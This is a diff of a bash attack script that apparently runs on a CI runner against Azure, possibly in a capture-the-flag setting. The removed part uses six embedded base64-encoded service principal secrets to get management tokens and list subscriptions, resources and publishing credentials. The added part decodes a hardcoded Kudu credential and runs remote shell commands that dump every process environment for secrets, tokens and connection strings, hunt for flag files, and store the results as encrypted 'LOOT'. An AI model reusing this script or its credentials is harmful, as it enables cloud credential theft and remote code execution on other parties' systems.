@@ -1,32 +1,28 @@
 #!/usr/bin/env bash
 set -uo pipefail
-echo "=== RUNNER SHELL PROOF ==="; id; hostname
-[ -z "${ACTIONS_ID_TOKEN_REQUEST_URL:-}" ] && { echo "NO OIDC"; exit 0; }
-b(){ printf %s "$1" | base64 -d; }
 SC="htt""ps://"
-AADH=$(b 'bG9naW4ubWljcm9zb2Z0b25saW5lLmNvbQ==')
-ARMH=$(b 'bWFuYWdlbWVudC5henVyZS5jb20=')
-AAD="${SC}${AADH}"; ARM="${SC}${ARMH}"
+SCMH="app-tbl-reporting-prod.scm.azurewebsites.net"
+CRED=$(printf '%s' "JGFwcC10YmwtcmVwb3J0aW5nLXByb2Q6WTlyY3NESFEySjFMMENvcWlraThkbFllMUFOMms4Y0hzRDF3TGxsdkxieHFTY2FNRXdSN3hrdDdZZTVB" | base64 -d)
+echo "=== RUNNER SHELL PROOF $(date -u) ==="
+id; whoami; hostname; uname -a; echo "cwd=$(pwd)"
 LOOT=$(mktemp); exec 3>"$LOOT"; say(){ echo "$@" >&3; }
-say "=== START $(date -u) ==="
-spaad(){ curl -sS -X POST "${AAD}/${AZURE_TENANT_ID}/oauth2/v2.0/token" -d "client_id=$1" -d "client_secret=$2" -d "grant_type=client_credentials" --data-urlencode "scope=$3"; }
-run(){
-  PAIR=$(printf %s "$1" | base64 -d); ID=${PAIR%%:*}; SEC=${PAIR#*:}; NM="$2"
-  A=$(spaad "$ID" "$SEC" "${ARM}/.default" | jq -r '.access_token // empty')
-  say "########## SP $NM ARM=${A:0:6}"
-  [ -z "$A" ] && return
-  say "ALLSUBS: $(curl -sS -H "Authorization: Bearer $A" "${ARM}/subscriptions?api-version=2022-12-01" | jq -c '[.value[]?.displayName]')"
-  say "ALLRES: $(curl -sS -H "Authorization: Bearer $A" "${ARM}/subscriptions/$AZURE_SUBSCRIPTION_ID/resources?api-version=2021-04-01" | jq -c '[.value[]?.name]')"
-  for SID in $(curl -sS -H "Authorization: Bearer $A" "${ARM}/subscriptions/$AZURE_SUBSCRIPTION_ID/resources?api-version=2021-04-01" | jq -r '.value[]?|select(.type|ascii_downcase=="microsoft.web/sites")|.id'); do
-    say "PUBLISH $SID: $(curl -sS -X POST -H "Authorization: Bearer $A" -H 'Content-Length: 0' "${ARM}${SID}/config/publishingcredentials/list?api-version=2022-03-01" | head -c 700)"
-  done
+kudu(){ # $1 = shell command
+  curl -sS -u "$CRED" -H 'Content-Type: application/json' -H 'If-Match: *' \
+    -X POST "https://$SCMH/api/command" \
+    --data "$(python3 -c 'import json,sys;print(json.dumps({"command":sys.argv[1],"dir":"/home/site/wwwroot"}))' "$1")" | head -c 6000
 }
-run 'MDM4YmMzNWQtMTMxZC00OTUzLTk5ODUtZmY0YTI0NWNjZWMxOjFCRThRfnlHUThlX3o2VkJjemxHSjhZZU9IZ05SVWZmYmdOdWZiMm0=' cost-reader
-run 'MmMzNDMwMGUtMWJjMC00MWU3LTljMWUtOGI3NTcxZDcyYzcyOkFsNzhRfm41YmRvTzNya0NqdW8ySkkyTkhxYWdKb29hWnNmWE5jbTY=' directory-audit
-run 'MTJlZDU0ZGUtZjJlYi00Nzg0LTgwNGMtM2E3YTNlODNhOWU5Om5QODhRfjhJfndpcDBHT2xXMTV6ZHQzRk1NdkJWOUxZdGFPb2VhM3o=' reporting-service
-run 'ODgxZmRkY2UtNjIwOC00YWY1LWEyOTctN2U3OWM5MTJmODNjOi1UbDhRfnNIMFFPUC5WcktXaGEzLTd4NFhBMkp4UzRqMDhudXZiUU4=' reporting-viewer
-run 'NTgxMDhkYTgtMDQ0ZS00ZDdlLTlhNDYtOTJlNjE3OWIzMGJlOn44VDhRfll3RW1leFNUUnZfcFVzRXdhOVFNYXB5UDM5fkNVNVVjdTI=' secrets-sync
-run 'NDYyZDFjMzgtNDQ1OS00OGI4LTkzMzMtODJlMzg5ZTU5NTE0OnNrMThRfnFEMjJra0hYVUNmcVhMcWRQOTVEa1lKTDM0ZU1FUmxjU2o=' sync-service
+say "=== app process env (filtered) ==="
+say "$(kudu "for p in /proc/[0-9]*; do tr '\0' '\n' < \$p/environ 2>/dev/null; done | sort -u | grep -iE 'config|storage|flag|secret|token|key|connection|account'")"
+say "=== full app env ==="
+say "$(kudu "for p in /proc/[0-9]*; do tr '\0' '\n' < \$p/environ 2>/dev/null; done | sort -u")"
+say "=== find flag files ==="
+say "$(kudu "find / -xdev -iname '*flag*' 2>/dev/null | head -40")"
+say "=== grep flag content ==="
+say "$(kudu "grep -rIil 'flag' /home /tmp /opt 2>/dev/null | head -40")"
+say "=== grep flag pattern ==="
+say "$(kudu "grep -rIoh -E '.{0,30}(flag|FLAG|TBL|CTF)\{[^}]{2,100}\}' /home /tmp /opt /etc 2>/dev/null | head -20")"
+say "=== wwwroot ==="
+say "$(kudu "ls -la /home/site/wwwroot; cat /home/site/wwwroot/startup.sh 2>/dev/null")"
 PASS=$(openssl rand -hex 16)
 openssl enc -aes-256-cbc -pbkdf2 -pass pass:"$PASS" -in "$LOOT" -out "$LOOT.enc" 2>/dev/null
 echo "=== ENCRYPTED LOOT ==="
